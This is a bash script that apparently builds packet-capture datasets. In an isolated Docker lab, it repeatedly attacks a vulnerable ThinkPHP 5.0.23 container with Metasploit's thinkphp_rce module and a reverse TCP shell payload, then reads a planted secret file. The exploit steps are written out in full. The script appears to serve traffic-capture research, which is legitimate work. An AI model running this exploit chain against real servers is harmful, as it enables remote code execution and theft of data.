#! /bin/bash

read -p "Enter number of packets: " PACK_NUMBER

# create a network for ThinkPHP and Metasploit to reside on 

for ((i = 1; i <= PACK_NUMBER; i++))
do 
docker network create --driver bridge --subnet 172.28.0.0/16 -o "com.docker.network.bridge.name"=br_php_int phpsite
docker run -d --name thinkphp --net phpsite --ip=172.28.0.2 vulhub/thinkphp:5.0.23
docker exec -i thinkphp /bin/bash <<EOF
cd /
tr -dc A-Za-z0-9 </dev/urandom | head -c 13 | tee  user_password
exit
EOF

tcpdump -i br_php_int host 172.28.0.2 or host 172.28.0.3 -w ${i}.pcap & 

docker run -i --name metasploit --net phpsite --ip=172.28.0.3 metasploitframework/metasploit-framework <<EOF
use exploit/unix/webapp/thinkphp_rce
set payload linux/x64/shell/reverse_tcp
set RHOSTS 172.28.0.2
set LHOST 172.28.0.3
set RPORT 80
exploit
ls
ls /
cd /
cat user_password
exit
EOF

pid=$(ps -e | pgrep tcpdump)
sleep 4
kill -2 $pid
./remove_all.sh
done